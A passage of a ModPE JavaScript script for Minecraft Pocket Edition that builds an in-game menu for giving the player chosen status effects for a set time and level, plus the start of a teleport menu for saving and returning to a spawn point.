ctx.runOnUiThread(new java.lang.Runnable(){
run: function(){ 
try{
GetText = new android.widget.PopupWindow();
var Layer = new android.widget.LinearLayout(ctx);
var sec = new android.widget.EditText(ctx);
var lvl = new android.widget.EditText(ctx);
var Dialog = new android.app.Dialog(ctx);
var Exit = new android.widget.Button(ctx);

Dialog.setTitle("Enter Time & Level");
Dialog.setContentView(Layer);

Layer.setOrientation(android.widget.LinearLayout.VERTICAL);
Dialog.show();
Layer.addView(sec);
Layer.addView(lvl);
Layer.addView(Exit);

sec.setText("Seconds");
lvl.setText("Level");
Exit.setText("Done");

Exit.setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(view){
s =sec.getText();
l =lvl.getText();
Dialog.dismiss();
inn4();
showMenuBtn();
}
});

GetText.setHeight(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
GetText.setWidth(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
GetText.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.TOP, 0, 0);
} catch (e){
print("The Effect Dialog Is Malfunctioning:"+e);
}
}});
}

function inn4() {
Entity.addEffect(getPlayerEnt(), MobEffect.wither, s*l, 0, false, true);
}
            
            var e5 = new Button(ctx);
            e5.setText("Poison");
            e5.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){
ee();
                }
            }));
            emenuLayout.addView(e5);

function ee() {
ctx.runOnUiThread(new java.lang.Runnable(){
run: function(){ 
try{
GetText = new android.widget.PopupWindow();
var Layer = new android.widget.LinearLayout(ctx);
var sec = new android.widget.EditText(ctx);
var lvl = new android.widget.EditText(ctx);
var Dialog = new android.app.Dialog(ctx);
var Exit = new android.widget.Button(ctx);

Dialog.setTitle("Enter Time & Level");
Dialog.setContentView(Layer);

Layer.setOrientation(android.widget.LinearLayout.VERTICAL);
Dialog.show();
Layer.addView(sec);
Layer.addView(lvl);
Layer.addView(Exit);

sec.setText("Seconds");
lvl.setText("Level");
Exit.setText("Done");

Exit.setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(view){
s =sec.getText();
l =lvl.getText();
Dialog.dismiss();
inn5();
showMenuBtn();
}
});

GetText.setHeight(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
GetText.setWidth(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
GetText.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.TOP, 0, 0);
} catch (e){
print("The Effect Dialog Is Malfunctioning:"+e);
}
}});
}

function inn5() {
Entity.addEffect(getPlayerEnt(), MobEffect.poison, s*l, 0, false, true);
}

var e6 = new Button(ctx);
            e6.setText("Weakness");
            e6.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){
                    ef();
                }
            }));
            emenuLayout.addView(e6);

function ef() {
ctx.runOnUiThread(new java.lang.Runnable(){
run: function(){ 
try{
GetText = new android.widget.PopupWindow();
var Layer = new android.widget.LinearLayout(ctx);
var sec = new android.widget.EditText(ctx);
var lvl = new android.widget.EditText(ctx);
var Dialog = new android.app.Dialog(ctx);
var Exit = new android.widget.Button(ctx);

Dialog.setTitle("Enter Time & Level");
Dialog.setContentView(Layer);

Layer.setOrientation(android.widget.LinearLayout.VERTICAL);
Dialog.show();
Layer.addView(sec);
Layer.addView(lvl);
Layer.addView(Exit);

sec.setText("Seconds");
lvl.setText("Level");
Exit.setText("Done");

Exit.setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(view){
s =sec.getText();
l =lvl.getText();
Dialog.dismiss();
inn6();
showMenuBtn();
}
});

GetText.setHeight(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
GetText.setWidth(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
GetText.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.TOP, 0, 0);
} catch (e){
print("The Effect Dialog Is Malfunctioning:"+e);
}
}});
}

function inn6() {
Entity.addEffect(getPlayerEnt(), MobEffect.weakness, s*l, 0, false, true);
}

var e7 = new Button(ctx);
            e7.setText("Hunger");
            e7.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){
eg()
                }
            }));
            emenuLayout.addView(e7);

function eg() {
ctx.runOnUiThread(new java.lang.Runnable(){
run: function(){ 
try{
GetText = new android.widget.PopupWindow();
var Layer = new android.widget.LinearLayout(ctx);
var sec = new android.widget.EditText(ctx);
var lvl = new android.widget.EditText(ctx);
var Dialog = new android.app.Dialog(ctx);
var Exit = new android.widget.Button(ctx);

Dialog.setTitle("Enter Time & Level");
Dialog.setContentView(Layer);

Layer.setOrientation(android.widget.LinearLayout.VERTICAL);
Dialog.show();
Layer.addView(sec);
Layer.addView(lvl);
Layer.addView(Exit);

sec.setText("Seconds");
lvl.setText("Level");
Exit.setText("Done");

Exit.setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(view){
s =sec.getText();
l =lvl.getText();
Dialog.dismiss();
inn7();
showMenuBtn();
}
});

GetText.setHeight(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
GetText.setWidth(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
GetText.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.TOP, 0, 0);
} catch (e){
print("The Effect Dialog Is Malfunctioning:"+e);
}
}});
}

function inn7() {
Entity.addEffect(getPlayerEnt(), MobEffect.hunger, s*l, 0, false, true);
}

var e8 = new Button(ctx);
            e8.setText("Night vision");
            e8.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){
eh();
                }
            }));
            emenuLayout.addView(e8);

function eh() {
ctx.runOnUiThread(new java.lang.Runnable(){
run: function(){ 
try{
GetText = new android.widget.PopupWindow();
var Layer = new android.widget.LinearLayout(ctx);
var sec = new android.widget.EditText(ctx);
var lvl = new android.widget.EditText(ctx);
var Dialog = new android.app.Dialog(ctx);
var Exit = new android.widget.Button(ctx);

Dialog.setTitle("Enter Time & Level");
Dialog.setContentView(Layer);

Layer.setOrientation(android.widget.LinearLayout.VERTICAL);
Dialog.show();
Layer.addView(sec);
Layer.addView(lvl);
Layer.addView(Exit);

sec.setText("Seconds");
lvl.setText("Level");
Exit.setText("Done");

Exit.setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(view){
s =sec.getText();
l =lvl.getText();
Dialog.dismiss();
inn8();
showMenuBtn();
}
});

GetText.setHeight(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
GetText.setWidth(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
GetText.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.TOP, 0, 0);
} catch (e){
print("The Effect Dialog Is Malfunctioning:"+e);
}
}});
}

function inn8() {
Entity.addEffect(getPlayerEnt(), MobEffect.nightVision, s*l, 0, false, true);
}

var e9 = new Button(ctx);
            e9.setText("Blindness");
            e9.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){
ei();
                }
            }));
            emenuLayout.addView(e9);

function ei() {
ctx.runOnUiThread(new java.lang.Runnable(){
run: function(){ 
try{
GetText = new android.widget.PopupWindow();
var Layer = new android.widget.LinearLayout(ctx);
var sec = new android.widget.EditText(ctx);
var lvl = new android.widget.EditText(ctx);
var Dialog = new android.app.Dialog(ctx);
var Exit = new android.widget.Button(ctx);

Dialog.setTitle("Enter Time & Level");
Dialog.setContentView(Layer);

Layer.setOrientation(android.widget.LinearLayout.VERTICAL);
Dialog.show();
Layer.addView(sec);
Layer.addView(lvl);
Layer.addView(Exit);

sec.setText("Seconds");
lvl.setText("Level");
Exit.setText("Done");

Exit.setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(view){
s =sec.getText();
l =lvl.getText();
Dialog.dismiss();
inn9();
showMenuBtn();
}
});

GetText.setHeight(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
GetText.setWidth(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
GetText.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.TOP, 0, 0);
} catch (e){
print("The Effect Dialog Is Malfunctioning:"+e);
}
}});
}

function inn9() {
Entity.addEffect(getPlayerEnt(), MobEffect.blindness, s*l, 0, false, true);
}

var e10 = new Button(ctx);
            e10.setText("Invisibility");
            e10.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){
 ej();
                }
            }));
            emenuLayout.addView(e10);

function ej() {
ctx.runOnUiThread(new java.lang.Runnable(){
run: function(){ 
try{
GetText = new android.widget.PopupWindow();
var Layer = new android.widget.LinearLayout(ctx);
var sec = new android.widget.EditText(ctx);
var lvl = new android.widget.EditText(ctx);
var Dialog = new android.app.Dialog(ctx);
var Exit = new android.widget.Button(ctx);

Dialog.setTitle("Enter Time & Level");
Dialog.setContentView(Layer);

Layer.setOrientation(android.widget.LinearLayout.VERTICAL);
Dialog.show();
Layer.addView(sec);
Layer.addView(lvl);
Layer.addView(Exit);

sec.setText("Seconds");
lvl.setText("Level");
Exit.setText("Done");

Exit.setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(view){
s =sec.getText();
l =lvl.getText();
Dialog.dismiss();
inn10();
showMenuBtn();
}
});

GetText.setHeight(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
GetText.setWidth(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
GetText.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.TOP, 0, 0);
} catch (e){
print("The Effect Dialog Is Malfunctioning:"+e);
}
}});
}

function inn10() {
Entity.addEffect(getPlayerEnt(), MobEffect.invisibility, s*l, 0, false, true);
}

var e11 = new Button(ctx);
            e11.setText("Water breathing");
            e11.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){
ek();
                }
            }));
            emenuLayout.addView(e11);

function ek() {
ctx.runOnUiThread(new java.lang.Runnable(){
run: function(){ 
try{
GetText = new android.widget.PopupWindow();
var Layer = new android.widget.LinearLayout(ctx);
var sec = new android.widget.EditText(ctx);
var lvl = new android.widget.EditText(ctx);
var Dialog = new android.app.Dialog(ctx);
var Exit = new android.widget.Button(ctx);

Dialog.setTitle("Enter Time & Level");
Dialog.setContentView(Layer);

Layer.setOrientation(android.widget.LinearLayout.VERTICAL);
Dialog.show();
Layer.addView(sec);
Layer.addView(lvl);
Layer.addView(Exit);

sec.setText("Seconds");
lvl.setText("Level");
Exit.setText("Done");

Exit.setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(view){
s =sec.getText();
l =lvl.getText();
Dialog.dismiss();
inn11();
showMenuBtn();
}
});

GetText.setHeight(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
GetText.setWidth(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
GetText.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.TOP, 0, 0);
} catch (e){
print("The Effect Dialog Is Malfunctioning:"+e);
}
}});
}

function inn11() {
Entity.addEffect(getPlayerEnt(), MobEffect.waterBreathing, s*l, 0, false, true);
}

var e12 = new Button(ctx);
            e12.setText("Fire resistance");
            e12.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){
el();
                }
            }));
            emenuLayout.addView(e12);

function el() {
ctx.runOnUiThread(new java.lang.Runnable(){
run: function(){ 
try{
GetText = new android.widget.PopupWindow();
var Layer = new android.widget.LinearLayout(ctx);
var sec = new android.widget.EditText(ctx);
var lvl = new android.widget.EditText(ctx);
var Dialog = new android.app.Dialog(ctx);
var Exit = new android.widget.Button(ctx);

Dialog.setTitle("Enter Time & Level");
Dialog.setContentView(Layer);

Layer.setOrientation(android.widget.LinearLayout.VERTICAL);
Dialog.show();
Layer.addView(sec);
Layer.addView(lvl);
Layer.addView(Exit);

sec.setText("Seconds");
lvl.setText("Level");
Exit.setText("Done");

Exit.setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(view){
s =sec.getText();
l =lvl.getText();
Dialog.dismiss();
inn12();
showMenuBtn();
}
});

GetText.setHeight(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
GetText.setWidth(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
GetText.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.TOP, 0, 0);
} catch (e){
print("The Effect Dialog Is Malfunctioning:"+e);
}
}});
}

function inn12() {
Entity.addEffect(getPlayerEnt(), MobEffect.fireResistance, s*l, 0, false, true);
}

var e13 = new Button(ctx);
            e13.setText("Resistance");
            e13.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){
em();
                }
            }));
            emenuLayout.addView(e13);

function em() {
ctx.runOnUiThread(new java.lang.Runnable(){
run: function(){ 
try{
GetText = new android.widget.PopupWindow();
var Layer = new android.widget.LinearLayout(ctx);
var sec = new android.widget.EditText(ctx);
var lvl = new android.widget.EditText(ctx);
var Dialog = new android.app.Dialog(ctx);
var Exit = new android.widget.Button(ctx);

Dialog.setTitle("Enter Time & Level");
Dialog.setContentView(Layer);

Layer.setOrientation(android.widget.LinearLayout.VERTICAL);
Dialog.show();
Layer.addView(sec);
Layer.addView(lvl);
Layer.addView(Exit);

sec.setText("Seconds");
lvl.setText("Level");
Exit.setText("Done");

Exit.setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(view){
s =sec.getText();
l =lvl.getText();
Dialog.dismiss();
inn13();
showMenuBtn();
}
});

GetText.setHeight(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
GetText.setWidth(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
GetText.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.TOP, 0, 0);
} catch (e){
print("The Effect Dialog Is Malfunctioning:"+e);
}
}});
}

function inn13() {
Entity.addEffect(getPlayerEnt(), MobEffect.damageResistance, s*l, 0, false, true);
}

var e14 = new Button(ctx);
            e14.setText("Regeneration");
            e14.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){
en();
                }
            }));
            emenuLayout.addView(e14);

function en() {
ctx.runOnUiThread(new java.lang.Runnable(){
run: function(){ 
try{
GetText = new android.widget.PopupWindow();
var Layer = new android.widget.LinearLayout(ctx);
var sec = new android.widget.EditText(ctx);
var lvl = new android.widget.EditText(ctx);
var Dialog = new android.app.Dialog(ctx);
var Exit = new android.widget.Button(ctx);

Dialog.setTitle("Enter Time & Level");
Dialog.setContentView(Layer);

Layer.setOrientation(android.widget.LinearLayout.VERTICAL);
Dialog.show();
Layer.addView(sec);
Layer.addView(lvl);
Layer.addView(Exit);

sec.setText("Seconds");
lvl.setText("Level");
Exit.setText("Done");

Exit.setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(view){
s =sec.getText();
l =lvl.getText();
Dialog.dismiss();
inn14();
showMenuBtn();
}
});

GetText.setHeight(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
GetText.setWidth(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
GetText.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.TOP, 0, 0);
} catch (e){
print("The Effect Dialog Is Malfunctioning:"+e);
}
}});
}

function inn14() {
Entity.addEffect(getPlayerEnt(), MobEffect.regeneration, s*l, 0, false, true);
}

var e15 = new Button(ctx);
            e15.setText("Nausea");
            e15.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){
 eo();
                }
            }));
            emenuLayout.addView(e15);

function eo() {
ctx.runOnUiThread(new java.lang.Runnable(){
run: function(){ 
try{
GetText = new android.widget.PopupWindow();
var Layer = new android.widget.LinearLayout(ctx);
var sec = new android.widget.EditText(ctx);
var lvl = new android.widget.EditText(ctx);
var Dialog = new android.app.Dialog(ctx);
var Exit = new android.widget.Button(ctx);

Dialog.setTitle("Enter Time & Level");
Dialog.setContentView(Layer);

Layer.setOrientation(android.widget.LinearLayout.VERTICAL);
Dialog.show();
Layer.addView(sec);
Layer.addView(lvl);
Layer.addView(Exit);

sec.setText("Seconds");
lvl.setText("Level");
Exit.setText("Done");

Exit.setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(view){
s =sec.getText();
l =lvl.getText();
Dialog.dismiss();
inn15();
showMenuBtn();
}
});

GetText.setHeight(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
GetText.setWidth(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
GetText.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.TOP, 0, 0);
} catch (e){
print("The Effect Dialog Is Malfunctioning:"+e);
}
}});
}

function inn15() {
Entity.addEffect(getPlayerEnt(), MobEffect.confusion, s*l, 0, false, true);
}

var e16 = new Button(ctx);
            e16.setText("Jump boost");
            e16.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){
 ep();
                }
            }));
            emenuLayout.addView(e16);

function ep() {
ctx.runOnUiThread(new java.lang.Runnable(){
run: function(){ 
try{
GetText = new android.widget.PopupWindow();
var Layer = new android.widget.LinearLayout(ctx);
var sec = new android.widget.EditText(ctx);
var lvl = new android.widget.EditText(ctx);
var Dialog = new android.app.Dialog(ctx);
var Exit = new android.widget.Button(ctx);

Dialog.setTitle("Enter Time & Level");
Dialog.setContentView(Layer);

Layer.setOrientation(android.widget.LinearLayout.VERTICAL);
Dialog.show();
Layer.addView(sec);
Layer.addView(lvl);
Layer.addView(Exit);

sec.setText("Seconds");
lvl.setText("Level");
Exit.setText("Done");

Exit.setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(view){
s =sec.getText();
l =lvl.getText();
Dialog.dismiss();
inn16();
showMenuBtn();
}
});

GetText.setHeight(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
GetText.setWidth(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
GetText.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.TOP, 0, 0);
} catch (e){
print("The Effect Dialog Is Malfunctioning:"+e);
}
}});
}

function inn16() {
Entity.addEffect(getPlayerEnt(), MobEffect.jump, s*l, 0, false, true);
}

var e17 = new Button(ctx);
            e17.setText("harm");
            e17.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){
eq();
                }
            }));
            emenuLayout.addView(e17);

function eq() {
ctx.runOnUiThread(new java.lang.Runnable(){
run: function(){ 
try{
GetText = new android.widget.PopupWindow();
var Layer = new android.widget.LinearLayout(ctx);
var sec = new android.widget.EditText(ctx);
var lvl = new android.widget.EditText(ctx);
var Dialog = new android.app.Dialog(ctx);
var Exit = new android.widget.Button(ctx);

Dialog.setTitle("Enter Time & Level");
Dialog.setContentView(Layer);

Layer.setOrientation(android.widget.LinearLayout.VERTICAL);
Dialog.show();
Layer.addView(sec);
Layer.addView(lvl);
Layer.addView(Exit);

sec.setText("Seconds");
lvl.setText("Level");
Exit.setText("Done");

Exit.setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(view){
s =sec.getText();
l =lvl.getText();
Dialog.dismiss();
inn17();
showMenuBtn();
}
});

GetText.setHeight(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
GetText.setWidth(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
GetText.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.TOP, 0, 0);
} catch (e){
print("The Effect Dialog Is Malfunctioning:"+e);
}
}});
}

function inn17() {
Entity.addEffect(getPlayerEnt(), MobEffect.harm, s*l, 0, false, true);
}

var e18 = new Button(ctx);
            e18.setText("heal");
            e18.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){
er();
                }
            }));
            emenuLayout.addView(e18);

function er() {
ctx.runOnUiThread(new java.lang.Runnable(){
run: function(){ 
try{
GetText = new android.widget.PopupWindow();
var Layer = new android.widget.LinearLayout(ctx);
var sec = new android.widget.EditText(ctx);
var lvl = new android.widget.EditText(ctx);
var Dialog = new android.app.Dialog(ctx);
var Exit = new android.widget.Button(ctx);

Dialog.setTitle("Enter Time & Level");
Dialog.setContentView(Layer);

Layer.setOrientation(android.widget.LinearLayout.VERTICAL);
Dialog.show();
Layer.addView(sec);
Layer.addView(lvl);
Layer.addView(Exit);

sec.setText("Seconds");
lvl.setText("Level");
Exit.setText("Done");

Exit.setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(view){
s =sec.getText();
l =lvl.getText();
Dialog.dismiss();
inn18();
showMenuBtn();
}
});

GetText.setHeight(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
GetText.setWidth(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
GetText.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.TOP, 0, 0);
} catch (e){
print("The Effect Dialog Is Malfunctioning:"+e);
}
}});
}

function inn18() {
Entity.addEffect(getPlayerEnt(), MobEffect.heal, s*l, 0, false, true);
}

var e19 = new Button(ctx);
            e19.setText("Strength");
            e19.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){
es();
                }
            }));
            emenuLayout.addView(e19);

function es() {
ctx.runOnUiThread(new java.lang.Runnable(){
run: function(){ 
try{
GetText = new android.widget.PopupWindow();
var Layer = new android.widget.LinearLayout(ctx);
var sec = new android.widget.EditText(ctx);
var lvl = new android.widget.EditText(ctx);
var Dialog = new android.app.Dialog(ctx);
var Exit = new android.widget.Button(ctx);

Dialog.setTitle("Enter Time & Level");
Dialog.setContentView(Layer);

Layer.setOrientation(android.widget.LinearLayout.VERTICAL);
Dialog.show();
Layer.addView(sec);
Layer.addView(lvl);
Layer.addView(Exit);

sec.setText("Seconds");
lvl.setText("Level");
Exit.setText("Done");

Exit.setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(view){
s =sec.getText();
l =lvl.getText();
Dialog.dismiss();
inn19();
showMenuBtn();
}
});

GetText.setHeight(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
GetText.setWidth(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
GetText.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.TOP, 0, 0);
} catch (e){
print("The Effect Dialog Is Malfunctioning:"+e);
}
}});
}

function inn19() {
Entity.addEffect(getPlayerEnt(), MobEffect.damageBoost, s*l, 0, false, true);
}

var e20 = new Button(ctx);
            e20.setText("Mining fatigue");
            e20.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){
et();
                }
            }));
            emenuLayout.addView(e20);

function et() {
ctx.runOnUiThread(new java.lang.Runnable(){
run: function(){ 
try{
GetText = new android.widget.PopupWindow();
var Layer = new android.widget.LinearLayout(ctx);
var sec = new android.widget.EditText(ctx);
var lvl = new android.widget.EditText(ctx);
var Dialog = new android.app.Dialog(ctx);
var Exit = new android.widget.Button(ctx);

Dialog.setTitle("Enter Time & Level");
Dialog.setContentView(Layer);

Layer.setOrientation(android.widget.LinearLayout.VERTICAL);
Dialog.show();
Layer.addView(sec);
Layer.addView(lvl);
Layer.addView(Exit);

sec.setText("Seconds");
lvl.setText("Level");
Exit.setText("Done");

Exit.setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(view){
s =sec.getText();
l =lvl.getText();
Dialog.dismiss();
inn20();
showMenuBtn();
}
});

GetText.setHeight(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
GetText.setWidth(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
GetText.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.TOP, 0, 0);
} catch (e){
print("The Effect Dialog Is Malfunctioning:"+e);
}
}});
}

function inn20() {
Entity.addEffect(getPlayerEnt(), MobEffect.digSlowdown, s*l, 0, false, true);
}

var e21 = new Button(ctx);
            e21.setText("Haste");
            e21.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){
eu();
                }
            }));
            emenuLayout.addView(e21);

function eu() {
ctx.runOnUiThread(new java.lang.Runnable(){
run: function(){ 
try{
GetText = new android.widget.PopupWindow();
var Layer = new android.widget.LinearLayout(ctx);
var sec = new android.widget.EditText(ctx);
var lvl = new android.widget.EditText(ctx);
var Dialog = new android.app.Dialog(ctx);
var Exit = new android.widget.Button(ctx);

Dialog.setTitle("Enter Time & Level");
Dialog.setContentView(Layer);

Layer.setOrientation(android.widget.LinearLayout.VERTICAL);
Dialog.show();
Layer.addView(sec);
Layer.addView(lvl);
Layer.addView(Exit);

sec.setText("Seconds");
lvl.setText("Level");
Exit.setText("Done");

Exit.setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(view){
s =sec.getText();
l =lvl.getText();
Dialog.dismiss();
inn21();
showMenuBtn();
}
});

GetText.setHeight(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
GetText.setWidth(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
GetText.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.TOP, 0, 0);
} catch (e){
print("The Effect Dialog Is Malfunctioning:"+e);
}
}});
}

function inn21() {
Entity.addEffect(getPlayerEnt(), MobEffect.digSpeed, s*l, 0, false, true);
}

var e22 = new Button(ctx);
            e22.setText("Slowness");
            e22.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){
ev();
                }
            }));
            emenuLayout.addView(e22);

function ev() {
ctx.runOnUiThread(new java.lang.Runnable(){
run: function(){ 
try{
GetText = new android.widget.PopupWindow();
var Layer = new android.widget.LinearLayout(ctx);
var sec = new android.widget.EditText(ctx);
var lvl = new android.widget.EditText(ctx);
var Dialog = new android.app.Dialog(ctx);
var Exit = new android.widget.Button(ctx);

Dialog.setTitle("Enter Time & Level");
Dialog.setContentView(Layer);

Layer.setOrientation(android.widget.LinearLayout.VERTICAL);
Dialog.show();
Layer.addView(sec);
Layer.addView(lvl);
Layer.addView(Exit);

sec.setText("Seconds");
lvl.setText("Level");
Exit.setText("Done");

Exit.setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(view){
s =sec.getText();
l =lvl.getText();
Dialog.dismiss();
inn22();
showMenuBtn();
}
});

GetText.setHeight(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
GetText.setWidth(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
GetText.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.TOP, 0, 0);
} catch (e){
print("The Effect Dialog Is Malfunctioning:"+e);
}
}});
}

function inn22() {
Entity.addEffect(getPlayerEnt(), MobEffect.movementSlowdown, s*l, 0, false, true);
}

var e23 = new Button(ctx);
            e23.setText("Speed boost");
            e23.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){
ew();
                }
            }));
            emenuLayout.addView(e23);

function ew() {
ctx.runOnUiThread(new java.lang.Runnable(){
run: function(){ 
try{
GetText = new android.widget.PopupWindow();
var Layer = new android.widget.LinearLayout(ctx);
var sec = new android.widget.EditText(ctx);
var lvl = new android.widget.EditText(ctx);
var Dialog = new android.app.Dialog(ctx);
var Exit = new android.widget.Button(ctx);

Dialog.setTitle("Enter Time & Level");
Dialog.setContentView(Layer);

Layer.setOrientation(android.widget.LinearLayout.VERTICAL);
Dialog.show();
Layer.addView(sec);
Layer.addView(lvl);
Layer.addView(Exit);

sec.setText("Seconds");
lvl.setText("Level");
Exit.setText("Done");

Exit.setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(view){
s =sec.getText();
l =lvl.getText();
Dialog.dismiss();
inn23();
showMenuBtn();
}
});

GetText.setHeight(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
GetText.setWidth(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
GetText.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.TOP, 0, 0);
} catch (e){
print("The Effect Dialog Is Malfunctioning:"+e);
}
}});
}

function inn23() {
Entity.addEffect(getPlayerEnt(), MobEffect.movementSpeed, s*l, 0, false, true);
}
		
		var D_exit = new android.widget.Button(ctx);
		D_exit.setText("Exit");
		D_exit.setOnClickListener(new android.view.View.OnClickListener() {
			onClick: function(v){
             emenu.dismiss();
showMenuBtn();
			}
		});
		emenuLayout.addView(D_exit);

            emenu = new PopupWindow(emenuLayout1, ctx.getWindowManager().getDefaultDisplay().getWidth()/3, ctx.getWindowManager().getDefaultDisplay().getHeight());
            emenu.setBackgroundDrawable(new ColorDrawable(GUIColor));
            emenu.showAtLocation(ctx.getWindow().getDecorView(), Gravity.CENTER | Gravity.TOP, 0, 0);
            }catch(error){
                Toast.makeText(ctx, "An error occured: " + error, 1).show();
            }
    }}));
}

function TeleMenu() {
ctx.runOnUiThread(new java.lang.Runnable({ run: function(){
        try{
            var tmenuLayout = new android.widget.LinearLayout(ctx);
            var tmenuScroll = new android.widget.ScrollView(ctx);
            var tmenuLayout1 = new android.widget.LinearLayout(ctx);
            tmenuLayout.setOrientation(1);
            tmenuLayout1.setOrientation(1);

            tmenuScroll.addView(tmenuLayout);
            tmenuLayout1.addView(tmenuScroll);

var MainTitle = new android.widget.TextView(ctx); MainTitle.setGravity(android.view.Gravity.CENTER);
		MainTitle.setText(name + space + version);
       MainTitle.setTextColor(GUIName);
		MainTitle.setTextSize(20);
		tmenuLayout.addView(MainTitle);

var titl = new android.widget.TextView(ctx); titl.setGravity(android.view.Gravity.CENTER);
		titl.setText("Teleport Menu");
       titl.setTextColor(GUIName);
		titl.setTextSize(20);
		tmenuLayout.addView(titl);

            var button = new android.widget.Button(ctx);
            button.setText("Select coords");
            button.setOnClickListener(new android.view.View.OnClickListener({
                onClick: function(viewarg){
Tsele();
tmenu.dismiss();
                }
            }));
            tmenuLayout.addView(button);

var Uspawn = new Button(ctx);
            Uspawn.setText("Set spawn");       
            Uspawn.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){
        xhome=Player.getX();
        yhome=Player.getY()+1;
        zhome=Player.getZ(); 
        save();
clientMessage("§7Home set to: " + Math.round(xhome) + ", " + Math.round(yhome) + ", " + Math.round(zhome) + ".");
                }
            }));
            tmenuLayout.addView(Uspawn);

var Rspawn = new Button(ctx);
            Rspawn.setText("Return to spawn");       
            Rspawn.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){
        load();
clientMessage("§7Returning to your saved spawn point.");
                }
            }));
            tmenuLayout.addView(Rspawn);

